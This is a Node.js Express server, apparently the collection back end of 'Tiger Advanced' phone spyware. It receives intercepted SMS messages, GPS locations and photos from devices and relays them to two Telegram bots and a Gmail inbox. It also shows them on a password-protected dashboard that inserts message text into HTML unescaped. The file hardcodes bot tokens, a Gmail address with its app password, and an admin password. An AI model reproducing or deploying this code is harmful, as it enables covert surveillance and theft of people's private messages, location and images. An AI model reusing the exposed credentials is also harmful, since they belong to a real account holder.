const express = require('express');
const axios = require('axios');
const path = require('path');
const nodemailer = require('nodemailer');
const app = express();

// Photo (Base64) badi hoti hai, isliye limit badhana zaruri hai
app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// --- ⚙️ CONFIGURATION ---
const ADMIN_USER = "admin";
const ADMIN_PASS = "tiger@123";

const BOT_1_TOKEN = '8394719862:AAGdG06eMVj_Mz4hFCqv-jHrmyiSqsDXppk';
const BOT_2_TOKEN = '7726217377:AAGbXU_DLLwNOo7JkRPXDuszrawEX7VyNjE'; // <-- Apna 2nd Bot Token yahan dalein
const CHAT_ID = '8394719862';

const MY_EMAIL = "harshrajsharma359@gmail.com";
const APP_PASSWORD = "ulhw zrxc bzbt hqnl";

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: { user: MY_EMAIL, pass: APP_PASSWORD }
});
// -----------------------

let smsLogs = [];

// 1. DATA RECEIVE ENDPOINT (SMS, GPS, PHOTO)
app.post('/log-sms', async (req, res) => {
    try {
        const { sender, message, device, timestamp, location, photo } = req.body;
        
        const mapsLink = location ? `https://www.google.com/maps?q=${location.lat},${location.lng}` : "Not Available";
        
        const newEntry = {
            id: Date.now(),
            device: device || 'Tiger-Mobile',
            sender: sender || 'System',
            message: message || 'No SMS Content',
            time: timestamp || new Date().toLocaleString(),
            location: mapsLink
        };

        smsLogs.unshift(newEntry);
        if (smsLogs.length > 100) smsLogs.pop();

        const telegramMsg = `🐯 *Tiger Advanced Alert!*\n\n` +
                          `📱 *Device:* ${newEntry.device}\n` +
                          `👤 *From:* ${newEntry.sender}\n` +
                          `💬 *Msg:* ${newEntry.message}\n` +
                          `📍 *GPS:* [View Location](${mapsLink})\n` +
                          `⏰ *Time:* ${newEntry.time}`;

        // --- Telegram Delivery ---
        const sendToTelegram = async (token) => {
            if (photo) {
                // Photo ke saath bhejnah
                const photoUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
                await axios.post(photoUrl, {
                    chat_id: CHAT_ID,
                    photo: photo, // Base64 string
                    caption: telegramMsg,
                    parse_mode: 'Markdown'
                });
            } else {
                // Bina photo ke bhejnah
                await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
                    chat_id: CHAT_ID,
                    text: telegramMsg,
                    parse_mode: 'Markdown'
                });
            }
        };

        // Dono bots par bhej rahe hain
        await Promise.all([sendToTelegram(BOT_1_TOKEN), sendToTelegram(BOT_2_TOKEN)]);

        // --- Email Delivery ---
        const mailOptions = {
            from: `"Tiger Advanced" <${MY_EMAIL}>`,
            to: MY_EMAIL,
            subject: `Tiger Alert from ${newEntry.sender}`,
            html: `<h3>New Update</h3>
                   <p><b>Sender:</b> ${newEntry.sender}</p>
                   <p><b>Message:</b> ${newEntry.message}</p>
                   <p><b>Location:</b> <a href="${mapsLink}">Google Maps Link</a></p>
                   <p><b>Time:</b> ${newEntry.time}</p>`,
            attachments: photo ? [{ filename: 'user_photo.jpg', content: photo, encoding: 'base64' }] : []
        };
        await transporter.sendMail(mailOptions);

        res.status(200).json({ status: 'success' });
    } catch (error) {
        console.error("Error:", error.message);
        res.status(500).json({ status: 'error' });
    }
});

// 2. ADMIN PANEL ACCESS
app.get('/admin', (req, res) => {
    const b64auth = (req.headers.authorization || '').split(' ')[1] || '';
    const [login, password] = Buffer.from(b64auth, 'base64').toString().split(':');

    if (login === ADMIN_USER && password === ADMIN_PASS) {
        return res.send(`
            <html>
            <head><title>Tiger Dashboard</title></head>
            <body style="font-family: Arial; padding: 20px;">
                <h2>🐅 Tiger Advanced Dashboard</h2>
                <table border="1" style="width:100%; border-collapse: collapse;">
                    <tr style="background:#eee;"><th>Time</th><th>Sender</th><th>Message</th><th>GPS</th></tr>
                    ${smsLogs.map(l => `<tr><td>${l.time}</td><td>${l.sender}</td><td>${l.message}</td><td><a href="${l.location}" target="_blank">Maps</a></td></tr>`).join('')}
                </table>
                <script>setTimeout(() => location.reload(), 15000);</script>
            </body>
            </html>
        `);
    }
    res.set('WWW-Authenticate', 'Basic realm="401"');
    res.status(401).send('Authentication required.');
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`🚀 Tiger Server Live on ${PORT}`));
